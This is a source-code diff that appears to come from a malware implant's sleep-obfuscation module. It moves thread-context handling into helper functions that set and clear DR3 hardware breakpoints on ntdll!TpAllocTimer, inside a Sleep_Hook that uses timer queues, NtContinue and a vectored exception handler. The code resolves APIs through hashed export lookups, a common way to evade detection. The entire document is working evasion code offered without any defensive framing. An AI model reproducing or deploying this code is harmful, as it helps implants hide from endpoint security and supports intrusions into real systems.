@@ -107,24 +107,44 @@ typedef struct
  * Uses DR3 to trigger the breakpoint without issue.
  *
 !*/
-D_SEC( D ) VOID EnableBreakpoint( _In_ PCONTEXT Context, _In_ PVOID Addr )
+D_SEC( D ) VOID EnableBreakpoint( _In_ PVOID Addr )
 {
+	API		Api;
+	CONTEXT		Ctx;
+
 	ULONG_PTR	Bit = 0;
 	ULONG_PTR	Msk = 0;
 
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
+
+	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
+	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
+
+	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+	Api.NtGetContextThread( NtCurrentThread(), &Ctx );
+
 	/* Set DR3 to the specified address */
-	Context->Dr3 = U_PTR( Addr );
+	Ctx.Dr3 = U_PTR( Addr );
 
 	/* Sets DR0-DR3 for HWBP */
 	Msk = ( 1UL << 16 ) - 1UL;
-	Bit = ( Context->Dr7 &~ ( Msk << 16 ) ) | ( 0 << 16 );
-	Context->Dr7 = U_PTR( Bit );
+	Bit = ( Ctx.Dr7 &~ ( Msk << 16 ) ) | ( 0 << 16 );
+	Ctx.Dr7 = U_PTR( Bit );
 
 	/* Sets DR3 as enabled */
 	Msk = ( 1UL << 1 ) - 1UL;
-	Bit = ( Context->Dr7 &~ ( Msk << 6 ) ) | ( 1 << 6 );
-	Context->Dr7 = U_PTR( Bit );
-	Context->Dr6 = U_PTR( 0 );
+	Bit = ( Ctx.Dr7 &~ ( Msk << 6 ) ) | ( 1 << 6 );
+	Ctx.Dr7 = U_PTR( Bit );
+	Ctx.Dr6 = U_PTR( 0 );
+
+	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+	Api.NtSetContextThread( NtCurrentThread(), &Ctx );
+
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
 };
 
 /*!
@@ -135,19 +155,38 @@ D_SEC( D ) VOID EnableBreakpoint( _In_ PCONTEXT Context, _In_ PVOID Addr )
  *
 !*/
 
-D_SEC( D ) VOID RemoveBreakpoint( _In_ PCONTEXT Context, _In_ PVOID Addr )
+D_SEC( D ) VOID RemoveBreakpoint( _In_ PVOID Addr )
 {
+	API		Api;
+	CONTEXT		Ctx;
+
 	ULONG_PTR	Msk = 0;
 	ULONG_PTR	Bit = 0;
 
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
+
+	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
+	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
+
+	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+	Api.NtGetContextThread( NtCurrentThread(), &Ctx );
+
 	/* Disables the DR3 local mode! */
 	Msk = ( 1ULL << 1 ) - 1UL;
-	Bit = ( Context->Dr7 &~ ( Msk << 6 ) ) | ( 0 << 6 );
-	Context->Dr7 = U_PTR( Bit );
-	Context->Dr6 = U_PTR( 0 );
-	Context->Dr3 = U_PTR( 0 );
+	Bit = ( Ctx.Dr7 &~ ( Msk << 6 ) ) | ( 0 << 6 );
+	Ctx.Dr7 = U_PTR( Bit );
+	Ctx.Dr6 = U_PTR( 0 );
+	Ctx.Dr3 = U_PTR( 0 );
+	Ctx.EFlags = Ctx.EFlags &~ 0x100;
 
-	__writeeflags( __readeflags() &~ 0x100 );
+	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+	Api.NtSetContextThread( NtCurrentThread(), &Ctx );
+
+	/* Zero out stack structures */
+	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
 };
 
 /*!
@@ -161,27 +200,14 @@ D_SEC( D ) VOID RemoveBreakpoint( _In_ PCONTEXT Context, _In_ PVOID Addr )
 !*/
 D_SEC( D ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ PTP_TIMER_CALLBACK Callback, _Inout_opt_ PVOID Context, _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron ) 
 {
-	API		Api;
-	CONTEXT		Ctx;
-
 	PTABLE		Tbl = NULL;
 	NTSTATUS 	Ret = STATUS_SUCCESS;
-
-	/* Zero out stack structures */
-	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
-
-	Api.NtGetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
-	Api.NtSetContextThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
 
 	/* Get a pointer to Table */
 	Tbl = C_PTR( G_SYM( Table ) );
 
 	/* Remove a breakpoint on the ntdll!TpAllocTimer  */
-	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-	Api.NtGetContextThread( NtCurrentThread(), &Ctx );
-	RemoveBreakpoint( &Ctx, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
-	Api.NtSetContextThread( NtCurrentThread(), &Ctx );
+	RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
 
 	/* Execute TpAllocTimer and swap CallbackEnviron with a replacement */
 	Ret = ( ( __typeof__( TpAllocTimerHook ) * ) PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) )(
@@ -190,14 +216,7 @@ D_SEC( D ) NTSTATUS NTAPI TpAllocTimerHook( _Out_ PTP_TIMER *Timer, _In_ PTP_TIM
 	);
 
 	/* Enables a breakpoint on the ntdll!TpAllocTimer */
-	Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-	Api.NtGetContextThread( NtCurrentThread(), &Ctx );
-	EnableBreakpoint( &Ctx, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
-	Api.NtSetContextThread( NtCurrentThread(), &Ctx );
-
-	/* Zero out stack structures */
-	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
+	EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
 
 	/* Return */
 	return Ret;
@@ -298,7 +317,6 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 	USTRING			Key;
 	USTRING			Buf;
 	CONTEXT			Ctx;
-	CONTEXT			Brk;
 	ANSI_STRING		Ani;
 	UNICODE_STRING		Uni;
 
@@ -335,7 +353,6 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 	RtlSecureZeroMemory( &Key, sizeof( Key ) );
 	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
 	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
-	RtlSecureZeroMemory( &Brk, sizeof( Brk ) );
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
 
@@ -452,10 +469,7 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 				SetThreadpoolCallbackCleanupGroup( & Tbl->Table->Debugger.PoolEnv, Cln, NULL );
 
 				/* Add breakpoint on ntdll!TpAllocTimer */
-				Brk.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-				Api.NtGetContextThread( NtCurrentThread(), &Brk );
-				EnableBreakpoint( &Brk, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
-				Api.NtSetContextThread( NtCurrentThread(), &Brk );
+				EnableBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
 
 				if ( NT_SUCCESS( Api.RtlCreateTimerQueue( &Que ) ) ) {
 
@@ -556,10 +570,7 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 								if ( ! NT_SUCCESS( Api.RtlCreateTimer( Que, &Tmr, Api.NtContinue, End, Del += 100, 0, WT_EXECUTEINTIMERTHREAD ) ) ) break;
 
 								/* Remove the breakpoint on ntdll!TpAllocTimer */
-								Brk.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-								Api.NtGetContextThread( NtCurrentThread(), &Brk );
-								RemoveBreakpoint( &Brk, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
-								Api.NtSetContextThread( NtCurrentThread(), &Brk );
+								RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
 
 								/* Remove the Vectored Exception Handler! */
 								if ( Api.RtlRemoveVectoredExceptionHandler( Veh ) ) {
@@ -606,12 +617,8 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 				Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, End );
 			};
 			if ( Veh != NULL ) {
-
 				/* Remove the breakpoint on ntdll!TpAllocTimer */
-				Brk.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-				Api.NtGetContextThread( NtCurrentThread(), &Brk );
-				RemoveBreakpoint( &Brk, C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
-				Api.NtSetContextThread( NtCurrentThread(), &Brk );
+				RemoveBreakpoint( C_PTR( PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_STR_TPALLOCTIMER ) ) );
 
 				/* Remove the Vectored Exception Handler */
 				Api.RtlRemoveVectoredExceptionHandler( Veh );
